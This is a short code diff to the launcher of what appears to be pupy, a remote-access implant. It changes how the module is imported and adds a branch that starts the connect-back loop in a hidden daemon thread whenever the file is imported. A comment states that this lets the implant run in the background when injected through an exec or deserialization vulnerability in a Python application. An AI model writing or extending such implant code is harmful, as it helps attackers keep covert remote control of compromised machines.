@@ -159,9 +159,10 @@ def main():
 			if "pupy" not in sys.modules:
 				add_pseudo_pupy_module(launcher.get_host())
 			else:
+				import pupy # necessary
 				pupy.get_connect_back_host=launcher.get_host
+			import pupy # also necessary
 
-			import pupy
 			pupy.infos={} #global dictionary to store informations persistent through a deconnection
 			pupy.infos['launcher']=LAUNCHER
 			pupy.infos['launcher_args']=LAUNCHER_ARGS
@@ -169,6 +170,7 @@ def main():
 		finally:
 			time.sleep(get_next_wait(attempt))
 			attempt+=1
+
 def rpyc_loop(launcher):
 	global attempt
 	try:
@@ -223,4 +225,8 @@ def rpyc_loop(launcher):
 
 if __name__=="__main__":
 	main()
+else:
+	t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
+	t.daemon=True
+	t.start()
 
